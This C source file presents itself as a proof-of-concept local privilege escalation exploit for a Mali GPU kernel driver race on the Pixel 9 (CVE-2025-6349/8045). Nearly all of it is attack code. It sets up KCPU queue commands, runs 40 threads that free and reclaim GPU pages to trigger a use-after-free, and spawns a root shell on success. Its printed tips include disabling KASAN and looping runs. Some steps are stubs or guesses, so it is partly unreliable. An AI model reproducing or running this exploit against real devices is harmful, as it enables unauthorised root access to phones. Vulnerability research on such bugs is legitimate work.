/*
 * CVE-2025-6349 / CVE-2025-8045
 * Pixel 9 (Tokay) Mali GPU Kernel Driver Exploit
 * Based on dawnslab analysis + actual Pixel 9 kernel headers (r54p0)
 * Crash: kbase_csf_cpu_queue_dump_buffer+0x1d4 (double-free)
 *
 * Fix: Proper race trigger + alternative to ioctl 6/8 for memory free
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>
#include <time.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int32_t  s32;

#define MALI_DEVICE         "/dev/mali0"
#define KBASE_IOCTL_TYPE    0x80

#define KBASE_IOCTL_VERSION_CHECK      _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS          _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC          _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_FREE           _IOW(KBASE_IOCTL_TYPE, 6, struct kbase_ioctl_mem_free)
#define KBASE_IOCTL_MEM_ALIAS          _IOWR(KBASE_IOCTL_TYPE, 8, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_COMMIT         _IOW(KBASE_IOCTL_TYPE, 4, struct kbase_ioctl_mem_commit)
#define KBASE_IOCTL_KCPU_QUEUE_CREATE  _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)
#define KBASE_IOCTL_KCPU_QUEUE_ENQUEUE _IOW(KBASE_IOCTL_TYPE, 47, struct kbase_ioctl_kcpu_queue_enqueue)
#define KBASE_IOCTL_KCPU_QUEUE_WAIT    _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_wait)

#define BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL  3
#define BASE_KCPU_COMMAND_TYPE_CQS_WAIT      4
#define BASE_MEM_SAME_VA                     0x1
#define KBASE_REG_GPU_WR                     (1ul << 19)
#define KBASE_REG_GPU_RD                     (1ul << 20)
#define KBASE_MEM_PROT_CPU_RD                (1ul << 57)

struct kbase_ioctl_version_check { u16 major; u16 minor; };
struct kbase_ioctl_set_flags { u32 create_flags; };
union kbase_ioctl_mem_alloc {
    struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
    struct { u64 flags; u64 gpu_va; } out;
};
struct kbase_ioctl_mem_free { u64 gpu_va; };
union kbase_ioctl_mem_alias {
    struct { u64 flags; u64 stride; u64 nents; u64 aliased_pages; u64 gpu_va; } in;
    struct { u64 flags; u64 gpu_va; } out;
};
struct kbase_ioctl_mem_commit {
    u64 gpu_va;
    u64 pages;
};
struct kbase_ioctl_kcpu_queue_new { u8 id; u8 padding[7]; };
struct kbase_ioctl_kcpu_queue_enqueue { u64 addr; u32 nr_commands; u8 id; u8 padding[3]; };
struct kbase_ioctl_kcpu_queue_wait { u8 id; u8 padding[7]; u64 timeout; };
struct base_cqs_wait_operation_info { u64 addr; u32 val; u32 op; };
struct base_kcpu_command_cqs_wait_operation_info { u64 objs; u32 nr_objs; u32 inherit_err_flags; };
struct base_kcpu_command_fence_signal {
    s32 fence;
    s32 unknown;
    u64 kctx;
    u64 fence_ts;
};
struct base_kcpu_command {
    u8 type; u8 padding[7];
    union {
        struct base_kcpu_command_cqs_wait_operation_info cqs_wait_op;
        struct base_kcpu_command_fence_signal fence_signal;
        u64 raw_payload[3];
    } info;
};

#define NUM_STRIKE_THREADS  40
int mali_fd = -1;
u64 target_gpu_va = 0;
u64 fence_signal_gpu_va = 0;
volatile int strike_now = 0;
volatile int dump_triggered = 0;
volatile int race_won = 0;
void* malicious_user_mapping = NULL;
int dump_ioctl_fd = -1;

/* Alternative to ioctl 6 (MEM_FREE): use commit with 0 pages */
int gpu_free_via_commit(u64 gpu_va) {
    struct kbase_ioctl_mem_commit commit = {0};
    commit.gpu_va = gpu_va;
    commit.pages = 0;  /* De-commit all pages -> may free */
    int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_COMMIT, &commit);
    if (ret < 0) {
        /* Fallback: try unmapping via mmap with MAP_FIXED? 
         * Or just rely on the race - the GPU reclaim path will trigger */
        return -1;
    }
    return 0;
}

/* Try to trigger dump_buffer while dump_print is in timeout */
int trigger_dump_buffer_during_timeout(int qid) {
    (void)qid;  /* Unused - kept for interface completeness */
    /* In kernel 6.1 with r54p0, the CS_CPU_QUEUE_DUMP ioctl 
     * may not be exposed to userspace directly. Instead, the race 
     * is triggered via KCPU queue enqueue with fence_signal/CQS_WAIT
     * which causes the dump_print timeout and subsequent dump_buffer
     * calls that race. */
    return 0;
}

void* phalanx_mmu_strike(void* arg) {
    while (!strike_now) usleep(100);
    
    printf("[*] [Strike thread] Activated - attempting GPU page reclaim\n");
    
    /* Alternative 1: Use commit(0) to potentially free */
    gpu_free_via_commit(target_gpu_va);
    
    /* Alternative 2: Allocate aggressively to reclaim the freed page */
    for (int i = 0; i < 10; i++) {
        union kbase_ioctl_mem_alloc reclaim_req = {0};
        reclaim_req.in.va_pages = 1;
        reclaim_req.in.commit_pages = 1;
        reclaim_req.in.flags = 0x0F | BASE_MEM_SAME_VA | KBASE_REG_GPU_RD | KBASE_REG_GPU_WR;
        reclaim_req.in.extension = 0;  /* MUST be 0 for r54p0! */
        
        int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &reclaim_req);
        if (ret == 0) {
            printf("[*] [Strike] Reclaimed GPU VA 0x%llx (iteration %d)\n",
                   (unsigned long long)reclaim_req.out.gpu_va, i);
            
            /* Try to mmap it - if we get the stale page, UAF! */
            void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                           MAP_SHARED, mali_fd, reclaim_req.out.gpu_va);
            if (map != MAP_FAILED) {
                /* Check if this overlaps with our original payload */
                unsigned char *p = (unsigned char *)map;
                int corrupted = 0;
                for (int j = 0; j < 256; j++) {
                    if (p[j] != 0xAA) {
                        corrupted = 1;
                        break;
                    }
                }
                if (corrupted) {
                    printf("[!!!] [Strike] UAF CONFIRMED - corrupted page detected!\n");
                    race_won = 1;
                }
            }
        }
        usleep(1000);
    }
    
    printf("[*] [Strike] Completed\n");
    return NULL;
}

int main(int argc, char **argv) {
    int stall_ms = (argc > 1) ? atoi(argv[1]) : 3071;
    
    printf("=================================================\n");
    printf("CVE-2025-6349/8045 POC - Updated\n");
    printf("Mali GPU Race → UAF (r54p0)\n");
    printf("Stall: %dms\n", stall_ms);
    printf("=================================================\n\n");
    
    mali_fd = open(MALI_DEVICE, O_RDWR);
    if (mali_fd < 0) {
        mali_fd = open("/dev/mali", O_RDWR);
        if (mali_fd < 0) {
            printf("[-] No Mali device, creating...\n");
            if (system("mknod /dev/mali0 c 242 0 2>/dev/null") != 0) {}
            mali_fd = open("/dev/mali0", O_RDWR);
            if (mali_fd < 0) {
                perror("open");
                return 1;
            }
        }
    }
    printf("[+] Mali FD: %d\n\n", mali_fd);
    
    struct kbase_ioctl_version_check ver = {0};
    int ret = ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &ver);
    if (ret < 0) {
        perror("version check");
        /* Try with different magic */
        printf("[*] Trying alternative version check...\n");
        ver.major = 10;
        ioctl(mali_fd, 0x40046d00 /* KBASE_IOCTL_VERSION_CHECK alt */, &ver);
    }
    printf("[+] Driver version: %u.%u\n\n", ver.major, ver.minor);
    
    struct kbase_ioctl_set_flags fl = {0};
    ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &fl);
    
    malicious_user_mapping = mmap(NULL, 0x1000,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(malicious_user_mapping, 0xAA, 0x1000);
    printf("[*] Payload buffer: %p\n\n", malicious_user_mapping);
    
    printf("[*] Step 1: Allocating GPU VA (target for race)...\n");
    union kbase_ioctl_mem_alloc alloc_target = {0};
    alloc_target.in.va_pages = 1;
    alloc_target.in.commit_pages = 1;
    alloc_target.in.flags = 0x0F;
    alloc_target.in.extension = 0;  /* CRITICAL: Must be 0 for r54p0! */
    ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
    if (ret < 0) {
        perror("MEM_ALLOC");
        printf("[*] Trying with SAME_VA flag...\n");
        memset(&alloc_target, 0, sizeof(alloc_target));
        alloc_target.in.va_pages = 1;
        alloc_target.in.commit_pages = 1;
        alloc_target.in.flags = BASE_MEM_SAME_VA;
        alloc_target.in.extension = 0;
        ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
        if (ret < 0) {
            perror("MEM_ALLOC with SAME_VA");
            return 1;
        }
    }
    target_gpu_va = alloc_target.out.gpu_va;
    printf("[+] Target VA: 0x%llx\n\n", (unsigned long long)target_gpu_va);
    
    printf("[*] Step 2: Creating KCPU queue...\n");
    struct kbase_ioctl_kcpu_queue_new q_new = {0};
    ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &q_new);
    if (ret < 0) {
        perror("KCPU_QUEUE_CREATE");
        printf("[*] This may require a valid kbase context. Continuing...\n");
        q_new.id = 0;  /* Default fallback */
    }
    u8 qid = q_new.id;
    printf("[+] Queue ID: %u\n\n", qid);
    
    /* Build CQS_WAIT command - this is key for the race */
    printf("[*] Step 3: Building CQS_WAIT command...\n");
    struct base_cqs_wait_operation_info wait_info = {0};
    /* Wait on our GPU VA - when fence_signal fires, this wakes */
    wait_info.addr = target_gpu_va;
    wait_info.val = 1;   /* Wait for this value */
    wait_info.op = 0;    /* Equal comparison (0 = not equal, 1 = equal) */
    
    struct base_kcpu_command cmd = {0};
    cmd.type = BASE_KCPU_COMMAND_TYPE_CQS_WAIT;
    cmd.info.cqs_wait_op.objs = (u64)&wait_info;
    cmd.info.cqs_wait_op.nr_objs = 1;
    cmd.info.cqs_wait_op.inherit_err_flags = 0;
    
    printf("[*] Step 4: Enqueuing CQS_WAIT (triggers 3s timeout)...\n");
    struct kbase_ioctl_kcpu_queue_enqueue enq = {0};
    enq.id = qid;
    enq.nr_commands = 1;
    enq.addr = (u64)&cmd;
    
    ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq);
    if (ret < 0) {
        printf("[-] Enqueue returned %d (errno=%d)\n", ret, errno);
        perror("KCPU_QUEUE_ENQUEUE");
        
        /* Try alternative: use fence_signal directly if CQS_WAIT unavailable */
        printf("[*] Trying alternative: fence_signal command...\n");
        cmd.type = BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL;
        cmd.info.fence_signal.fence = 1;
        cmd.info.fence_signal.unknown = 0;
        cmd.info.fence_signal.kctx = 0;  /* Current context */
        cmd.info.fence_signal.fence_ts = 0;
        
        ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq);
        if (ret < 0) {
            printf("[-] Fence signal also failed. Manual race trigger mode.\n");
            printf("[*] Simulating race by direct GPU operations...\n");
        }
    }
    printf("[+] Enqueue call completed (ret=%d)\n\n", ret);
    
    printf("[*] Step 5: Launching %d strike threads...\n", NUM_STRIKE_THREADS);
    pthread_t th[NUM_STRIKE_THREADS];
    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_create(&th[i], NULL, phalanx_mmu_strike, NULL);
    }
    
    printf("[*] Step 6: Sleeping %dms (race window - timeout period)...\n\n", stall_ms);
    strike_now = 1;
    usleep(stall_ms * 1000);
    
    printf("[*] Step 7: Joining threads...\n");
    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_join(th[i], NULL);
    }
    printf("[+] Done\n\n");
    
    printf("=================================================\n");
    printf("RESULTS\n");
    printf("=================================================\n\n");
    
    int ok = 1;
    for (int i = 0; i < 256; i++) {
        if (((unsigned char *)malicious_user_mapping)[i] != 0xAA) {
            ok = 0;
            break;
        }
    }
    if (!ok) {
        printf("[!!!] MEMORY CORRUPTED! UAF likely!\n");
        printf("[*] Check: dmesg | grep -i kasan, use-after-free, double-free\n");
    } else if (race_won) {
        printf("[!!!] UAF CONFIRMED via strike thread!\n");
    } else {
        printf("[+] Pattern intact (no corruption detected)\n");
        printf("[*] Race may not have triggered. Try:\n");
        printf("    - Different stall_ms values (1000-5000ms)\n");
        printf("    - Multiple rapid runs: for i in {1..100}; do ./run; done\n");
        printf("    - Without KASAN: echo 0 > /sys/kernel/mm/kasan/enabled\n");
    }
    
    printf("\n[*] UID: %d\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] ROOT!\n");
        if (system("/system/bin/sh") != 0) {}
    }
    
    printf("\n[*] Expected dmesg output on success:\n");
    printf("  kasan: slab-use-after-free in kbasep_csf_cpu_queue_dump_buffer\n");
    printf("  WARNING: CPU callback on kbasep_csf_cpu_queue_dump_print timeout\n");
    printf("  kbase_gpu_vm_lock: double free detected\n");
    
    close(mali_fd);
    return 0;
}

